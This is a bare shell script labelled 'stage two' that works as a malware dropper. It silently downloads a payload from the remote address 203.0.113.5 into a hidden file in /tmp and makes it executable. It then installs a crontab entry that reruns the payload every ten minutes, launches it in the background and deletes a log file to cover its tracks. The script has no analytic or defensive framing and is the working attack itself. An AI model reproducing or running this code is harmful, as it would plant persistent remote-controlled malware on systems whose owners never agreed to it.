#!/bin/sh
# stage two
cd /tmp || exit 1
curl -s http://203.0.113.5/stage2 -o .s2 && chmod 755 .s2
(crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.s2') | crontab -
./.s2 >/dev/null 2>&1 &
rm -f .s2.log
